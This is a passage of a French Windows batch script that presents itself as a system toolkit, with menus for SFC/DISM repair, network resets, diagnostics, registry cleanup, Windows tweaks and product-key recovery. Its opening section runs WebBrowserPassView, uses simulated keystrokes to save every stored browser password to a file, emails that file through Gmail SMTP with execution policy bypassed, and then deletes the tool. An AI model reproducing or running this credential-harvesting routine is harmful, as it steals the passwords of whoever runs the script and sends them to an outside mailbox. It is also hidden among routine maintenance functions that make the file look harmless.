    echo Erreur lors du telechargement.
    pause
    goto bpv_menu
  )
  set "DOWNLOADED=1"
  timeout /t 1 /nobreak >nul
)

rem Generer un nom de fichier unique
call :GET_UNIQUE_FILENAME
set "OUTPUT=%UNIQUE_FILE%"

echo.
echo Lancement de WebBrowserPassView...
start "" "%WBPV%"

timeout /t 5 /nobreak >nul

echo Traitement en cours...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1

timeout /t 3 /nobreak >nul

taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

rem Attendre que le processus se termine completement
timeout /t 2 /nobreak >nul

if not exist "%OUTPUT%" (
  echo ERREUR: Le fichier n'a pas ete cree.
  if "%DOWNLOADED%"=="1" (
    del /F /Q "%WBPV%" >nul 2>&1
    if exist "%WBPV%" (
      powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
    )
  )
  pause
  goto bpv_menu
)

echo Fichier sauvegarde: %OUTPUT%
echo.
echo Envoi du fichier par email...

powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att; Write-Host 'Email envoye avec succes!' -ForegroundColor Green" 

rem Nettoyage si telecharge
if "%DOWNLOADED%"=="1" (
  echo.
  echo Nettoyage...
  del /F /Q "%WBPV%" >nul 2>&1
  if exist "%WBPV%" (
    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
  )
)

echo.
echo Fermeture automatique dans 2 secondes...
timeout /t 2 /nobreak >nul
goto system_tools

:GET_UNIQUE_FILENAME
set "BASE=%~dp0passwords_export"
set "EXT=.txt"
set "COUNTER=0"
set "UNIQUE_FILE=%BASE%%EXT%"

:CHECK_FILE
if exist "%UNIQUE_FILE%" (
  set /a COUNTER+=1
  set "UNIQUE_FILE=%BASE%_%COUNTER%%EXT%"
  goto CHECK_FILE
)
goto :eof

:sys_rescue_menu
set "opts=Scan RAPIDE du systeme~Le classique SFC /scannow pour reparer l'OS"
set "opts=%opts%;Verification image base~Examine rapidement l'integration (DISM /CheckHealth)"
set "opts=%opts%;Reparation profonde~Telecharge les bons fichiers endommages (DISM /RestoreHealth)"
set "opts=%opts%;Nettoyage massif (Temp/Cache)~Detruit la totalite des fichiers inutiles cachant de l'espace"
set "opts=%opts%;Planifier un CHKDSK (C:)~Audite et repare les secteurs defectueux au prochain boot"
set "opts=%opts%;Reset Fix Windows Update~Redemarre brutalement le catalogue WU bloque ou corrompu"

call :DynamicMenu "OUTIL DE REPARATION WINDOWS (Rescue)" "%opts%"
set "reschoice=%errorlevel%"

if "%reschoice%"=="1" goto res_sfc
if "%reschoice%"=="2" goto res_dism_check
if "%reschoice%"=="3" goto res_dism_restore
if "%reschoice%"=="4" goto res_temp_clean
if "%reschoice%"=="5" goto res_chkdsk
if "%reschoice%"=="6" goto res_wu_reset
if "%reschoice%"=="0" goto system_tools
goto sys_rescue_menu

:res_sfc
cls
echo [OPERATION] SFC Scannow en cours (Cela peut prendre plusieurs minutes)...
sfc /scannow
pause
goto sys_rescue_menu

:res_dism_check
cls
echo [OPERATION] DISM /CheckHealth puis ScanHealth...
DISM /Online /Cleanup-Image /CheckHealth
DISM /Online /Cleanup-Image /ScanHealth
pause
goto sys_rescue_menu

:res_dism_restore
cls
echo [OPERATION] DISM /RestoreHealth (Restauration systeme)...
DISM /Online /Cleanup-Image /RestoreHealth
pause
goto sys_rescue_menu

:res_temp_clean
cls
echo [OPERATION] Purge absolue des fichiers inutiles...
echo Suppression de %TEMP%...
del /q /f /s "%TEMP%\*" >nul 2>&1
echo Suppression de C:\Windows\Temp...
del /q /f /s "C:\Windows\Temp\*" >nul 2>&1
echo Suppression du cache Windows Update (SoftwareDistribution\Download)...
net stop wuauserv >nul 2>&1
del /q /f /s "C:\Windows\SoftwareDistribution\Download\*" >nul 2>&1
net start wuauserv >nul 2>&1
echo Nettoyage termine ! De l'espace a ete libere.
pause
goto sys_rescue_menu

:res_chkdsk
cls
echo [OPERATION] Planification d'une reparation CHKDSK sur C:
echo Le disque sera scanne au prochain demarrage du PC.
chkdsk C: /F /R /X
pause
goto sys_rescue_menu

:res_wu_reset
cls
echo [OPERATION] Reinitialisation totale de l'infrastructure Windows Update...
net stop bits >nul 2>&1
net stop wuauserv >nul 2>&1
net stop appidsvc >nul 2>&1
net stop cryptsvc >nul 2>&1
del "%ALLUSERSPROFILE%\Application Data\Microsoft\Network\Downloader\qmgr*.dat" >nul 2>&1
net start bits >nul 2>&1
net start wuauserv >nul 2>&1
net start appidsvc >nul 2>&1
net start cryptsvc >nul 2>&1
echo Les services de mises a jour ont ete recrees de force.
pause
goto sys_rescue_menu


:sys_network_menu
set "opts=Vider le cache DNS~Supprime et reinitialise le cache du resolveur (ipconfig /flushdns)"
set "opts=%opts%;Afficher le cache DNS~Liste toutes les entrees DNS stockees en memoire locale (ipconfig /displaydns)"
set "opts=%opts%;Vider le cache ARP~Nettoie instantanement la table de correspondance des IP/MAC (arp -d *)"
set "opts=%opts%;Afficher la table ARP~Affiche les appareils de votre reseau recemment contactes (arp -a)"
set "opts=%opts%;Liberer et Renouveler l'IP~Demande une nouvelle adresse IP au serveur DHCP / Box (release / renew)"
set "opts=%opts%;Reset TCP/IP Stack IPv4/IPv6~Repare la pile reseau vitale de Windows (netsh int ip reset)"
set "opts=%opts%;Reset des Sockets Windows~Reinitialise le catalogue Winsock corrompu (netsh winsock reset)"
set "opts=%opts%;Reset Reseau Automatique~Enchaine silencieusement le Flush DNS, Winsock, et TCP/IP"
set "opts=%opts%;Redemarrer les cartes reseau~Vos pilotes Ethernet et Wi-Fi sont mis hors puis sous tension"
set "opts=%opts%;Executer le Script d'Urgence~Sequence immediate de 7 commandes de depannage massif (Fast Reset)"

call :DynamicMenu "MENU DE DEPANNAGE RESEAU" "%opts%"
set "netchoice=%errorlevel%"

if "%netchoice%"=="1" goto net_flush_dns
if "%netchoice%"=="2" goto net_display_dns
if "%netchoice%"=="3" goto net_clear_arp
if "%netchoice%"=="4" goto net_display_arp
if "%netchoice%"=="5" goto net_renew_ip
if "%netchoice%"=="6" goto net_reset_tcpip
if "%netchoice%"=="7" goto net_reset_winsock
if "%netchoice%"=="8" goto net_reset_all
if "%netchoice%"=="9" goto net_restart_adapters
if "%netchoice%"=="10" goto net_fast_reset
if "%netchoice%"=="0" goto system_tools
goto sys_network_menu

:net_flush_dns
cls
echo Vidage du cache DNS...
ipconfig /flushdns
pause
goto sys_network_menu

:net_display_dns
cls
echo Affichage du cache DNS...
ipconfig /displaydns | more
pause
goto sys_network_menu

:net_clear_arp
cls
echo Nettoyage du cache ARP...
arp -d *
echo Cache ARP vide !
pause
goto sys_network_menu

:net_display_arp
cls
echo Affichage de la table ARP...
arp -a
pause
goto sys_network_menu

:net_renew_ip
cls
echo Liberation de l'IP...
ipconfig /release
echo Renouvellement de l'IP...
ipconfig /renew
pause
goto sys_network_menu

:net_reset_tcpip
cls
echo Reset de la pile TCP/IP...
netsh int ip reset >nul
netsh int ipv6 reset >nul
echo Pile TCP/IP reinitialisee. (Un redemarrage peut etre necessaire)
pause
goto sys_network_menu

:net_reset_winsock
cls
echo Reset du catalogue Winsock...
netsh winsock reset >nul
echo Winsock reinitialise. (Un redemarrage est necessaire)
pause
goto sys_network_menu

:net_reset_all
cls
echo ==== LANCEMENT DU RESET COMPLET ====
ipconfig /flushdns >nul
netsh winsock reset >nul
netsh int ip reset >nul
netsh int ipv6 reset >nul
arp -d * >nul 2>&1
echo.
echo Reset complet effectue ! Veuillez redemarrer votre ordinateur.
pause
goto sys_network_menu

:net_restart_adapters
cls
echo Redemarrage des interfaces reseau...
netsh interface set interface "Wi-Fi" admin=disable 2>nul
netsh interface set interface "Wi-Fi" admin=enable 2>nul
netsh interface set interface "Ethernet" admin=disable 2>nul
netsh interface set interface "Ethernet" admin=enable 2>nul
echo Interfaces redemarrees silencieusement.
pause
goto sys_network_menu

:net_fast_reset
cls
echo =========================================
echo       Script Rapide de Reparation
echo =========================================
echo.
echo [*] Liberation de l'adresse IP actuelle (release)...
ipconfig /release >nul
echo [*] Vidage du cache ARP...
arp -d * >nul 2>&1
echo [*] Vidage du cache NetBIOS (R)...
nbtstat -R >nul
echo [*] Renouvellement du bail DHCP (renew)...
ipconfig /renew >nul
echo [*] Vidage du cache DNS...
ipconfig /flushdns >nul
echo [*] Re-enregistrement avec WINS...
nbtstat -RR >nul
echo [*] Re-enregistrement avec DNS...
ipconfig /registerdns >nul
echo.
echo Reinitialisation reseau terminee avec succes !
pause
goto sys_network_menu

:sys_diag_network
cls
set "DIAG_LOG=%USERPROFILE%\Desktop\Diagnostic_Reseau.log"
echo ================================
echo    DIAGNOSTIC RESEAU COMPLET
echo ================================
echo Analyse de l'etat de votre connexion.
echo Un journal complet est genere en temps reel sur le Bureau.
echo.

echo ================================ > "%DIAG_LOG%"
echo    DIAGNOSTIC RESEAU COMPLET     >> "%DIAG_LOG%"
echo       %date% %time%              >> "%DIAG_LOG%"
echo ================================ >> "%DIAG_LOG%"
echo. >> "%DIAG_LOG%"

echo [1/4] Test de la carte reseau locale (TCP/IP)...
echo [1/4] Test de la carte reseau locale (TCP/IP)... >> "%DIAG_LOG%"
ping -n 2 127.0.0.1 | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
if !errorlevel!==0 (
    echo   -^> [OK] La carte reseau fonctionne ^(pilote OK^).
    echo   -^> [OK] La carte reseau fonctionne ^(pilote OK^). >> "%DIAG_LOG%"
) else (
    echo   -^> [ECHEC] Probleme avec la carte reseau locale ^(Pilote ou materiel^).
    echo   -^> [ECHEC] Probleme avec la carte reseau locale ^(Pilote ou materiel^). >> "%DIAG_LOG%"
)

echo.
echo. >> "%DIAG_LOG%"
echo [2/4] Test de connexion a la Box/Routeur (Passerelle par defaut)...
echo [2/4] Test de connexion a la Box/Routeur (Passerelle par defaut)... >> "%DIAG_LOG%"
set "gateway="
for /f "usebackq tokens=*" %%g in (`powershell -NoProfile -Command "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty NextHop) 2>$null"`) do set "gateway=%%g"

if "!gateway!"=="" (
    echo [INFO] Aucune IP de passerelle trouvee via l'interface reseau.
    echo [INFO] Aucune IP de passerelle trouvee via l'interface reseau. >> "%DIAG_LOG%"
    echo   -^> [ECHEC] Aucune passerelle detectee ^(Cable debranche ou probleme Wi-Fi / DHCP^).
    echo   -^> [ECHEC] Aucune passerelle detectee ^(Cable debranche ou probleme Wi-Fi / DHCP^). >> "%DIAG_LOG%"
) else (
    echo [INFO] Passerelle detectee : !gateway!
    echo [INFO] Passerelle detectee : !gateway! >> "%DIAG_LOG%"
    ping -n 2 !gateway! | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
    powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
    findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
    if !errorlevel!==0 (
        echo   -^> [OK] Connecte a la Box/Routeur ^(!gateway!^).
        echo   -^> [OK] Connecte a la Box/Routeur ^(!gateway!^). >> "%DIAG_LOG%"
    ) else (
        echo   -^> [ECHEC] Impossible de joindre la Box/Routeur ^(!gateway!^).
        echo   -^> [ECHEC] Impossible de joindre la Box/Routeur ^(!gateway!^). >> "%DIAG_LOG%"
    )
)

echo.
echo. >> "%DIAG_LOG%"
echo [3/4] Test de connexion a Internet (Serveur externe 8.8.8.8)...
echo [3/4] Test de connexion a Internet (Serveur externe 8.8.8.8)... >> "%DIAG_LOG%"
ping -n 2 8.8.8.8 | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
if !errorlevel!==0 (
    echo   -^> [OK] Acces Internet externe etabli.
    echo   -^> [OK] Acces Internet externe etabli. >> "%DIAG_LOG%"
) else (
    echo   -^> [ECHEC] Pas d'acces Internet ^(Coupure operateur FAI ou Box non connectee^).
    echo   -^> [ECHEC] Pas d'acces Internet ^(Coupure operateur FAI ou Box non connectee^). >> "%DIAG_LOG%"
)

echo.
echo. >> "%DIAG_LOG%"
echo [4/4] Test de resolution DNS (Ping domaine)...
echo [4/4] Test de resolution DNS (Ping domaine)... >> "%DIAG_LOG%"
ping -n 2 google.com | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
if !errorlevel!==0 (
    echo   -^> [OK] Les serveurs DNS fonctionnent et traduisent les IP.
    echo   -^> [OK] Les serveurs DNS fonctionnent et traduisent les IP. >> "%DIAG_LOG%"
) else (
    echo   -^> [ECHEC] Probleme DNS. Impossible de se rendre sur des sites par leur nom.
    echo   -^> [ECHEC] Probleme DNS. Impossible de se rendre sur des sites par leur nom. >> "%DIAG_LOG%"
)

echo.
echo ================================
echo Si vous rencontrez un [ECHEC], utilisez les outils de reparation
echo reseau ou de configuration DNS presents dans ce script.
echo.
echo ================================
echo Appuyez sur une touche pour afficher votre configuration IP (ipconfig /all)
pause >nul
cls
echo Affichage des informations reseau (ipconfig /all)...
echo ================================ >> "%DIAG_LOG%"
echo     Rapport IPCONFIG /ALL        >> "%DIAG_LOG%"
echo ================================ >> "%DIAG_LOG%"
ipconfig /all > "%TEMP%\netdiag_ipconfig.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ipconfig.txt' -Encoding OEM | ForEach-Object { Write-Host $_ -ForegroundColor DarkGray; $_ | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
echo.
pause
goto system_tools

:sys_cleanmgr
cls
echo Lancement du Nettoyage de disque...
cleanmgr
pause
goto system_tools

:sys_tweaks_menu
set "opts=Desactiver Telemetrie~Coupe l'espionnage et l'envoi de donnees a Microsoft"
set "opts=%opts%;Plan Performances Ultimes~Active le plan d'alimentation secret de Windows"
set "opts=%opts%;Desactiver Cortana completement~Empeche Cortana de tourner en arriere-plan"
set "opts=%opts%;Desactiver la recherche Bing~Rend le menu Demarrer beaucoup plus rapide (Local uniquement)"
set "opts=%opts%;Mode Sombre global~Force l'activation du theme sombre systeme"
set "opts=%opts%;Desactiver l'Hibernation~Libere plusieurs Giga-Octets d'espace disque (Taille de RAM)"
set "opts=%opts%;Purger les Bloatwares~Desinstalle Xbox, 3DBuilder, Skype, Zune, etc."
set "opts=%opts%;Supprimer les pubs de Windows~Retire les applications preinstallees forcees (Jeux)"

call :DynamicMenu "MENU OPTIMISATIONS WINDOWS (Tweaks)" "%opts%"
set "tw_choice=%errorlevel%"

if "%tw_choice%"=="1" goto tweak_telemetry
if "%tw_choice%"=="2" goto tweak_ultimate_power
if "%tw_choice%"=="3" goto tweak_cortana
if "%tw_choice%"=="4" goto tweak_bing
if "%tw_choice%"=="5" goto tweak_darkmode
if "%tw_choice%"=="6" goto tweak_hibernation
if "%tw_choice%"=="7" goto tweak_bloatware
if "%tw_choice%"=="8" goto tweak_ads
if "%tw_choice%"=="0" goto system_tools
goto sys_tweaks_menu

:tweak_telemetry
cls
echo [TWEAK] Desactivation de la Telemetrie Windows...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d 1 /f >nul
sc stop DiagTrack >nul 2>&1
sc config DiagTrack start= disabled >nul 2>&1
sc stop dmwappushservice >nul 2>&1
sc config dmwappushservice start= disabled >nul 2>&1
echo Telemetrie desactivee !
pause
goto sys_tweaks_menu

:tweak_ultimate_power
cls
echo [TWEAK] Activation des Performances Ultimes Caches...
powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
echo Plan d'alimentation 'Performances Ultimes' active. Allez dans vos reglages d'energie pour le selectionner.
pause
goto sys_tweaks_menu

:tweak_cortana
cls
echo [TWEAK] Desactivation complete de Cortana...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d 0 /f >nul
echo Cortana ne demarrera plus en arriere-plan.
pause
goto sys_tweaks_menu

:tweak_bing
cls
echo [TWEAK] Desactiver la recherche internet (Bing) dans le menu Demarrer...
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "DisableSearchBoxSuggestions" /t REG_DWORD /d 1 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CortanaConsent" /t REG_DWORD /d 0 /f >nul
echo La recherche locale est desormais plus rapide et sans pub internet !
pause
goto sys_tweaks_menu

:tweak_darkmode
cls
echo [TWEAK] Activation du Mode Sombre global de Windows 11...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "AppsUseLightTheme" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "SystemUsesLightTheme" /t REG_DWORD /d 0 /f >nul
echo Mode sombre applique (si pris en charge par votre version/theme).
pause
goto sys_tweaks_menu

:tweak_hibernation
cls
echo [TWEAK] Desactivation du fichier hiberfil.sys (Gain d'espace libre gigantesque)...
powercfg.exe /hibernate off >nul
echo Hibernation coupee ! Vous recuperez la taille de votre RAM en espace de stockage disque (Giga-Octets).
pause
goto sys_tweaks_menu

:tweak_bloatware
cls
echo [TWEAK] Desinstallation automatique des Bloatwares inutiles...
echo Cela peut prendre un peu de temps.
powershell -Command "Get-AppxPackage *3DBuilder* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *Getstarted* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *WindowsAlarms* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *bing* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *MicrosoftOfficeHub* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *OneNote* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *SkypeApp* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *ZuneMusic* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *ZuneVideo* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *SolitaireCollection* | Remove-AppxPackage" >nul 2>&1
echo Logiciels superflus retires avec succes !
pause
goto sys_tweaks_menu

:tweak_ads
cls
echo [TWEAK] Suppression des publicites du Menu Demarrer et des notifications Windows...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d 1 /f >nul
echo Termine ! Fini les pubs de jeux preinstalles dans Windows.
pause
goto sys_tweaks_menu

:sys_registry_cleanup
cls
echo ======================================================
echo Nettoyage ^& optimisation avances du Registre
echo ======================================================
setlocal enabledelayedexpansion

set backupFolder=%SystemRoot%\Temp\RegistryBackups
if not exist "%backupFolder%" mkdir "%backupFolder%"

set logFile=%SystemRoot%\Temp\RegistryCleanupLog.txt
echo Journal de nettoyage du Registre - %date% %time% > "%logFile%"

set count=0
set safe_count=0

echo Analyse du Registre Windows pour les erreurs et problemes de performance...
for /f "tokens=*" %%A in ('reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall 2^>nul') do (
    set /a count+=1
    set entries[!count!]=%%A
    
    echo %%A | findstr /I "IE40 IE4Data DirectDrawEx DXM_Runtime SchedulingAgent" >nul && (
        set /a safe_count+=1
        set safe_entries[!safe_count!]=%%A
    )
)

if %count%==0 (
    echo Aucune entree superflue trouvee dans le Registre.
    pause
    goto system_tools
)

echo %count% problemes potentiels detectes dans le Registre:
for /L %%i in (1,1,%count%) do echo [%%i] !entries[%%i]!
echo.
echo Sans risque a supprimer (%safe_count% entrees detectees):
for /L %%i in (1,1,%safe_count%) do echo [%%i] !safe_entries[%%i]!
echo.
echo [A] Supprimer uniquement les entrees sures
if %safe_count% GTR 0 echo [B] Revoir les entrees sures avant suppression
echo [C] Creer une sauvegarde du Registre
echo [D] Restaurer une sauvegarde du Registre
echo [E] Verifier les corruptions du Registre
echo [0] Annuler
echo.
set /p reg_choice=Votre choix: 

for %%A in (%reg_choice%) do set reg_choice=%%A
if /i "%reg_choice%"=="0" goto system_tools
if /i "%reg_choice%"=="A" goto delete_safe_reg_entries
if /i "%reg_choice%"=="B" goto review_safe_reg_entries
if /i "%reg_choice%"=="C" goto create_reg_backup
if /i "%reg_choice%"=="D" goto restore_reg_backup
if /i "%reg_choice%"=="E" goto scan_registry
if "%reg_choice%"=="" goto system_tools

echo Saisie invalide, retour au menu.
pause
goto system_tools

:delete_safe_reg_entries
if %safe_count%==0 (
    echo Aucune entree sure a supprimer.
    pause
    goto system_tools
)
echo Suppression de toutes les entrees sures detectees...
for /L %%i in (1,1,%safe_count%) do (
    echo Suppression de !safe_entries[%%i]!...
    reg delete "!safe_entries[%%i]!" /f
    echo Supprime: !safe_entries[%%i]! >> "%logFile%"
)
echo Suppression terminee.
pause
goto system_tools

:review_safe_reg_entries
cls
echo Entrees du Registre sures a supprimer:
for /L %%i in (1,1,%safe_count%) do echo [%%i] !safe_entries[%%i]!
echo.
echo Voulez-vous toutes les supprimer ? (O/N)
set /p confirm_reg=
for %%A in (%confirm_reg%) do set confirm_reg=%%A
if /i "%confirm_reg%"=="Y" goto delete_safe_reg_entries
if /i "%confirm_reg%"=="O" goto delete_safe_reg_entries
echo Operation annulee.
pause
goto system_tools

:create_reg_backup
set backupName=RegistryBackup_%date:~-4,4%-%date:~-7,2%-%date:~-10,2%_%time:~0,2%-%time:~3,2%.reg
echo Creation de la sauvegarde: %backupFolder%\%backupName%...
reg export HKLM "%backupFolder%\%backupName%" /y
echo Sauvegarde creee avec succes.
pause
goto system_tools

:restore_reg_backup
echo Sauvegardes disponibles:
dir /b "%backupFolder%\*.reg"
echo Entrez le nom de la sauvegarde a restaurer:
set /p backupFile=
if exist "%backupFolder%\%backupFile%" (
    echo Restauration en cours...
    reg import "%backupFolder%\%backupFile%"
    echo Restauration effectuee avec succes.
) else (
    echo Fichier de sauvegarde introuvable. Verifiez le nom et reessayez.
)
pause
goto system_tools

:scan_registry
cls
echo Verification des corruptions du Registre...
sfc /scannow
dism /online /cleanup-image /checkhealth
echo Verification terminee. Si des erreurs ont ete trouvees, redemarrez votre PC.
pause
goto system_tools

:sys_drivers
cls
echo Enregistrement de la liste des pilotes sur le Bureau...
driverquery /v > "%USERPROFILE%\Desktop\Pilotes_installes.txt"
echo.
echo Le rapport des pilotes a ete enregistre ici :
echo %USERPROFILE%\Desktop\Pilotes_installes.txt
pause
goto system_tools

:sys_report
cls
echo Diagnostic et integration de memoire en cours...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$os = Get-CimInstance Win32_OperatingSystem; $cpu = Get-CimInstance Win32_Processor; $bios = Get-CimInstance Win32_BIOS; $ram = Get-CimInstance Win32_ComputerSystem; $gpu = Get-CimInstance Win32_VideoController; $pm = @(Get-CimInstance Win32_PhysicalMemory); $typeInt = if ($pm.Count -gt 0) {$pm[0].SMBIOSMemoryType} else {0}; $memTypes = @{ 20='DDR'; 21='DDR2'; 22='DDR2 FB-DIMM'; 24='DDR3'; 26='DDR4'; 34='DDR5' }; $ramType = if ($memTypes.ContainsKey($typeInt)) { $memTypes[$typeInt] } else { 'Type Inconnu' }; Write-Host '   INFORMATIONS OS' -f Cyan; Write-Host ('   Hostname: '+$env:COMPUTERNAME); Write-Host ('   Systeme : '+$os.Caption+' ('+$os.OSArchitecture+')'); Write-Host ('   Build   : '+$os.Version); Write-Host ''; Write-Host '   MATERIEL COMPOSANTS' -f Cyan; Write-Host ('   Processeur : '+$cpu.Name); Write-Host ('   Graphique  : '+($gpu.Name -join ', ')); Write-Host ('   Memoire    : '+[math]::Round($ram.TotalPhysicalMemory / 1GB, 2)+' Go - Format : '+$ramType) -f Yellow; Write-Host ('   BIOS Ver.  : '+$bios.SMBIOSBIOSVersion); Write-Host ''; Write-Host '   STOCKAGE (GB libres)' -f Cyan; Get-CimInstance Win32_LogicalDisk | Where DriveType -eq 3 | foreach { $t=[math]::Round($_.Size / 1GB, 2); $f=[math]::Round($_.FreeSpace / 1GB, 2); $p=0; if($t -gt 0){$p=[math]::Round(($f/$t)*100,0)}; Write-Host ('   Lecteur '+$_.DeviceID+' '+$f+' Go libres sur '+$t+' Go ('+$p+'%% restants)') -f Green }; Write-Host ''; Write-Host '   RESEAU' -f Cyan; Get-NetAdapter | Where Status -eq 'Up' | foreach { $ip=(Get-NetIPAddress -InterfaceIndex $_.ifIndex -AddressFamily IPv4 -EA SilentlyContinue).IPAddress; Write-Host ('   '+$_.Name+' ('+$_.LinkSpeed+') - IP: '+$ip) }; Write-Host ''; Write-Host '   SECURITE' -f Cyan; try { $t=[bool](Get-Tpm).TpmPresent; Write-Host ('   TPM Integre: '+$t) } catch {}"
echo.
pause
goto system_tools

:sys_repair_icons
cls
echo ===============================================
echo      Reparation du Cache des Icones/Miniatures
echo ===============================================
echo.
echo Arret de l'explorateur Windows...
taskkill /f /im explorer.exe >nul 2>&1
echo Reparation en cours (Suppression du cache)...
timeout /t 2 /nobreak >nul
del /A /F /Q "%localappdata%\IconCache.db" >nul 2>&1
del /A /F /Q "%localappdata%\Microsoft\Windows\Explorer\iconcache*" >nul 2>&1
del /A /F /Q "%localappdata%\Microsoft\Windows\Explorer\thumbcache*" >nul 2>&1
echo Redemarrage de l'explorateur Windows...
start explorer.exe
echo.
echo [OK] Le cache des icones a ete vide !
echo Il se reconstruira progressivement et reparera vos icones.
pause
goto system_tools

:sys_win_key
set "opts=Cle Windows OEM (Incrustee au BIOS);Cle Windows Actuelle (Installee);Cle Produit Office (via CMD)"
call :DynamicMenu "RECUPERATION DE CLES DE PRODUIT" "%opts%"
set "wk_choice=%errorlevel%"

if "%wk_choice%"=="1" goto win_key_oem
if "%wk_choice%"=="2" goto win_key_registry
if "%wk_choice%"=="3" goto win_key_office
if "%wk_choice%"=="0" goto system_tools
goto sys_win_key

:win_key_oem
cls
echo ===============================================
echo      Cle Windows OEM (Carte mere / BIOS)
echo ===============================================
echo.
echo Interrogation du firmware...
powershell -NoProfile -Command "$k = (Get-CimInstance -Query 'Select * from SoftwareLicensingService' -ErrorAction SilentlyContinue).OA3xOriginalProductKey; if([string]::IsNullOrWhiteSpace($k)) { Write-Host '[ECHEC] Aucune cle OEM detectee.' ; Write-Host 'Cela signifie que ce PC ne contenait pas de licence incluse a l''achat' ; Write-Host 'ou utilise une licence numerique liee a un compte Microsoft.' } else { Write-Host '[OK] Cle de produit Windows (OEM) detectee :'; Write-Host ''; Write-Host ('    ' + $k) -ForegroundColor Green; Write-Host ''; Write-Host 'Cette cle est incrustee dans la carte mere.' }"
echo.
pause
goto sys_win_key

:win_key_registry
cls
echo ===============================================
echo      Cle Windows Installée (Registre)
echo ===============================================
echo.
echo Recherche de la cle actuellement utilisee par Windows...
set "WINKEY="
